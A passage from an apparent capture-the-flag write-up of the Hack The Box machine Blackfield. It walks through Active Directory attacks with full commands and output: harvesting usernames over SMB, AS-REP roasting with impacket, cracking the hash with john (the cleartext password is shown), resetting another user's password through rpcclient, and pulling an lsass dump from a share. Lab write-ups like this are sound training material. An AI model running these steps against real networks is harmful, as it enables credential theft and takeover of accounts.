  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020

                7846143 blocks of size 4096. 3535644 blocks available
smb: <span class="se">\&gt;</span>
</pre></table></code></div></div><p>I got a lot of <code class="language-plaintext highlighter-rouge">dirs</code> , I can confirm that every single <strong>dir</strong> is empty using the <code class="language-plaintext highlighter-rouge">recurse on</code></p><p>If we look closely at the every dir name , They are more than enough to undertsand that these are <code class="language-plaintext highlighter-rouge">usernames</code> ,</p><blockquote><p>copy paste the dirs names in a text file</p></blockquote><h1 id="using-getnpuserpy-to-get-tgt">Using GetNPuser.py to get tgt</h1><p>Now since we have users for the machine we can use <code class="language-plaintext highlighter-rouge">GetNPuser</code> from the <code class="language-plaintext highlighter-rouge">impacket</code> so we can generate a <strong>TGT</strong> for any valid user on the machine , I will generate the hash in john format so i can use <strong>john the ripper</strong> to crack the hash.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>âžœ  blackfield python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.LOCAL/ <span class="nt">-usersfile</span> users.txt <span class="nt">-format</span> john <span class="nt">-outputfile</span> hashes.txt <span class="nt">-dc-ip</span> 10.10.10.192
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

<span class="o">[</span>-] invalid principal syntax
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
<span class="o">[</span>-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found <span class="k">in </span>Kerberos database<span class="o">)</span>
</pre></table></code></div></div><p>After some time , if we check our <code class="language-plaintext highlighter-rouge">hashes.txt</code> we got a hash here</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>âžœ  blackfield <span class="nb">cat </span>hashes.txt 
<span class="nv">$krb5asrep$support</span>@BLACKFIELD.LOCAL:db45c03b6589d4845a96c3e774e6061f<span class="nv">$7a1828d430c2bb8882a6be2c7b80f14ec2245e19c37c336027c0d6531192e4ed67785a64c4d6babdb4d0eab3b0ef92e8c75d8b069a4a992a3a5c7df1827266b69329362df12df70be10d76ccdd737cc403afad8f6f9184b87</span>
a79f5db2493aa27a35443dc2caa610ba306ea521c7d1e4e41ffe6233dd9f3e28723086a0ff831b2686cf2b63385d3acca48bd1c03f8ef4af8efdf7e5d8aad71a08dab88fb70a900ba687f1ad992a4c246e1dd2af4275f308de7d7b71e03dcbbc37c59dc0c5f457b46cdf0beb8fa75384455d5c53c0866336b03975
84d13225a28eac045a0f9f0945ec65476fd9c2c4c91fad2e867c11b980fbce712
</pre></table></code></div></div><p>And the hash is for the <strong>user</strong> <code class="language-plaintext highlighter-rouge">support</code></p><blockquote><p>Time to crack it with john</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>âžœ  blackfield john hashes.txt <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="c">#00^BlackKnight  ($krb5asrep$support@BLACKFIELD.LOCAL)</span>
1g 0:00:00:08 DONE <span class="o">(</span>2020-06-10 12:33<span class="o">)</span> 0.1197g/s 1716Kp/s 1716Kc/s 1716KC/s <span class="c">#1WIF3Y..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>And here we cracked it gentlyâ€¦.</p><h1 id="login-into-rpcclient">Login into rpcclient</h1><p>After enumerating here and there that where to use the <code class="language-plaintext highlighter-rouge">credentials</code> , I logged in myself to <code class="language-plaintext highlighter-rouge">rpcclient</code></p><h2 id="enumerating-users">Enumerating users</h2><blockquote><p><a href="https://ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging" target="_blank">https://ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging</a></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>âžœ  blackfield rpcclient 10.10.10.192 <span class="nt">-U</span> support 
Enter WORKGROUP<span class="se">\s</span>upports password: 
rpcclient <span class="nv">$&gt;</span> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]
user:[admin1] rid:[0x13ed]
</pre></table></code></div></div><p>These are the <strong>avalilable</strong> users on the machine</p><blockquote><p>Getting info about current user</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> queryuser support
        User Name   :   support
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 10 Jun 2020 16:41:38 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last <span class="nb">set </span>Time   :      Sun, 23 Feb 2020 12:53:24 EST
        Password can change Time :      Mon, 24 Feb 2020 12:53:24 EST
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x450
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000000b
        padding1[0..7]...
        logon_hrs[0..21]...
</pre></table></code></div></div><blockquote><p>available privileges</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 <span class="o">(</span>0x0:0x2<span class="o">)</span>
SeAssignPrimaryTokenPrivilege           0:3 <span class="o">(</span>0x0:0x3<span class="o">)</span>
SeLockMemoryPrivilege           0:4 <span class="o">(</span>0x0:0x4<span class="o">)</span>
SeIncreaseQuotaPrivilege                0:5 <span class="o">(</span>0x0:0x5<span class="o">)</span>
SeMachineAccountPrivilege               0:6 <span class="o">(</span>0x0:0x6<span class="o">)</span>
SeTcbPrivilege          0:7 <span class="o">(</span>0x0:0x7<span class="o">)</span>
SeSecurityPrivilege             0:8 <span class="o">(</span>0x0:0x8<span class="o">)</span>
SeTakeOwnershipPrivilege                0:9 <span class="o">(</span>0x0:0x9<span class="o">)</span>
SeLoadDriverPrivilege           0:10 <span class="o">(</span>0x0:0xa<span class="o">)</span>
SeSystemProfilePrivilege                0:11 <span class="o">(</span>0x0:0xb<span class="o">)</span>
SeSystemtimePrivilege           0:12 <span class="o">(</span>0x0:0xc<span class="o">)</span>
SeProfileSingleProcessPrivilege                 0:13 <span class="o">(</span>0x0:0xd<span class="o">)</span>
SeIncreaseBasePriorityPrivilege                 0:14 <span class="o">(</span>0x0:0xe<span class="o">)</span>
SeCreatePagefilePrivilege               0:15 <span class="o">(</span>0x0:0xf<span class="o">)</span>
SeCreatePermanentPrivilege              0:16 <span class="o">(</span>0x0:0x10<span class="o">)</span>
SeBackupPrivilege               0:17 <span class="o">(</span>0x0:0x11<span class="o">)</span>
SeRestorePrivilege              0:18 <span class="o">(</span>0x0:0x12<span class="o">)</span>
SeShutdownPrivilege             0:19 <span class="o">(</span>0x0:0x13<span class="o">)</span>
SeDebugPrivilege                0:20 <span class="o">(</span>0x0:0x14<span class="o">)</span>
SeAuditPrivilege                0:21 <span class="o">(</span>0x0:0x15<span class="o">)</span>
SeSystemEnvironmentPrivilege            0:22 <span class="o">(</span>0x0:0x16<span class="o">)</span>
SeChangeNotifyPrivilege                 0:23 <span class="o">(</span>0x0:0x17<span class="o">)</span>
SeRemoteShutdownPrivilege               0:24 <span class="o">(</span>0x0:0x18<span class="o">)</span>
SeUndockPrivilege               0:25 <span class="o">(</span>0x0:0x19<span class="o">)</span>
SeSyncAgentPrivilege            0:26 <span class="o">(</span>0x0:0x1a<span class="o">)</span>
SeEnableDelegationPrivilege             0:27 <span class="o">(</span>0x0:0x1b<span class="o">)</span>
SeManageVolumePrivilege                 0:28 <span class="o">(</span>0x0:0x1c<span class="o">)</span>
SeImpersonatePrivilege          0:29 <span class="o">(</span>0x0:0x1d<span class="o">)</span>
SeCreateGlobalPrivilege                 0:30 <span class="o">(</span>0x0:0x1e<span class="o">)</span>
SeTrustedCredManAccessPrivilege                 0:31 <span class="o">(</span>0x0:0x1f<span class="o">)</span>
SeRelabelPrivilege              0:32 <span class="o">(</span>0x0:0x20<span class="o">)</span>
SeIncreaseWorkingSetPrivilege           0:33 <span class="o">(</span>0x0:0x21<span class="o">)</span>
SeTimeZonePrivilege             0:34 <span class="o">(</span>0x0:0x22<span class="o">)</span>
SeCreateSymbolicLinkPrivilege           0:35 <span class="o">(</span>0x0:0x23<span class="o">)</span>
SeDelegateSessionUserImpersonatePrivilege               0:36 <span class="o">(</span>0x0:0x24<span class="o">)</span>
rpcclient <span class="nv">$&gt;</span> 
</pre></table></code></div></div><p>These are some <strong>available</strong> privs that the current user have â€¦.From the few of the above privs i concluded that the user can chnage the other userâ€™s <code class="language-plaintext highlighter-rouge">password</code>.</p><blockquote><p><a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/" target="_blank">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a></p></blockquote><p>I tried almost all the <strong>available</strong> users and i got succed on the user <code class="language-plaintext highlighter-rouge">audit2020</code> to chnage its passwordâ€¦</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> setuserinfo2 audit2020 23 <span class="s1">'0xPrashant'</span>
</pre></table></code></div></div><p>And now i can login myself to the <code class="language-plaintext highlighter-rouge">smbclient</code> to enumerate the share <code class="language-plaintext highlighter-rouge">forecnsic</code>â€¦.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>âžœ  blackfield smbclient  //blackfield.htb/forensic <span class="nt">-U</span> audit2020
Enter WORKGROUP<span class="se">\a</span>udit2020s password: 
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                7846143 blocks of size 4096. 3523743 blocks available
smb: <span class="se">\&gt;</span> 
</pre></table></code></div></div><p>Wellâ€¦the user <code class="language-plaintext highlighter-rouge">audit2020</code> has permissions to read the share</p><h1 id="got-the-file-lsasszip">Got the file lsass.zip</h1><p>After some manual <code class="language-plaintext highlighter-rouge">enum</code> i got a <strong>.zip</strong> file called lsass.zip from the dir <code class="language-plaintext highlighter-rouge">memory_analysis</code> , its was hard to find this file amongst so many files</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> get lsass.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> getting file <span class="se">\m</span>emory_analysis<span class="se">\l</span>sass.zip of size 41936098 as lsass.zip SMBecho failed <span class="o">(</span>NT_STATUS_CONNECTION_DISCONNECTED<span class="o">)</span><span class="nb">.</span> The connection is disconnected now

âžœ  blackfield 
</pre></table></code></div></div><p>But i got a <code class="language-plaintext highlighter-rouge">NT_STATUS_IO_TIMEOUT</code> error when i was downloading the file â€¦. Maybe the file size is too large</p><h2 id="mounting-the-share-locally">Mounting the share locally</h2><p>i can also mount the share <code class="language-plaintext highlighter-rouge">forensic</code> to my machine and i can enumerate the dirs like some <strong>regular</strong> ones.</p><blockquote><p>mount using the mount utility from <code class="language-plaintext highlighter-rouge">cifs.utility</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>âžœ  blackfield mount <span class="nt">-t</span> cifs //10.10.10.192/forensic /mnt <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>audit2020
Password <span class="k">for </span>audit2020@//10.10.10.192/forensic:  <span class="k">**********</span>
âžœ  blackfield
